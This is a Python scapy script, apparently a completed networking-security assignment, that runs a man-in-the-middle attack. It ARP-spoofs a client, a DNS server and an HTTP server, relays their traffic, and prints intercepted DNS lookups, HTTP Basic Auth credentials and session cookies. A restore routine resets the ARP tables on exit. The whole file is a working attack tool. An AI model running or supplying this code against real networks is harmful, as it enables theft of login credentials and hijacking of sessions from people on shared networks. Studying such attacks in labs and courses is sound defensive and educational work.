from scapy.all import *

import argparse
import sys
import threading
import time
import re

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    responses,unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=IP),timeout=2,retry=10)
    return responses.res[0][1].getlayer(ARP).hwsrc


#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # Spoof httpServer ARP table
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # Spoof dnsServer ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    send(ARP(op = 2, pdst = dst_ip, psrc = src_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = src_mac))



# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    send(ARP(op = 2, pdst = dstIP, psrc = srcIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = srcMAC))
    send(ARP(op = 2, pdst = srcIP, psrc = dstIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = dstMAC))
    


# TODO: handle intercepted packets
def interceptor(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    if packet.haslayer(DNS) and packet.getlayer(IP).src == clientIP and packet.getlayer(Ether).src == clientMAC:
        print(chr(42)+"hostname:"+packet.getlayer(DNS).qd.qname.decode()[:-1])
        send(IP(dst = dnsServerIP, src = clientIP)/packet.getlayer(UDP)/packet.getlayer(DNS))
    if packet.haslayer(DNS) and packet.getlayer(IP).src == dnsServerIP and packet.getlayer(Ether).src == dnsServerMAC:
        print(chr(42)+"hostaddr:"+packet.getlayer(DNS).an.rdata)
        send(IP(dst = clientIP, src = dnsServerIP)/packet.getlayer(UDP)/packet.getlayer(DNS))
    if packet.haslayer(TCP) and packet.getlayer(IP).src == clientIP and packet.getlayer(Ether).src == clientMAC:
        if packet.haslayer(Raw):
            print(chr(42)+"basicauth:"+re.search(r'Authorization: Basic (.*)', packet.getlayer(Raw).load.decode()).group()[21:])
        send(IP(dst = httpServerIP, src = clientIP)/packet.getlayer(TCP))
    if packet.haslayer(TCP) and packet.getlayer(IP).src == httpServerIP and packet.getlayer(Ether).src == httpServerMAC:
        if packet.haslayer(Raw):
            print(chr(42)+"cookie:"+re.search(r'Set-Cookie: session=(.*)', packet.getlayer(Raw).load.decode()).group()[20:])
        send(IP(dst = clientIP, src = httpServerIP)/packet.getlayer(TCP))


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
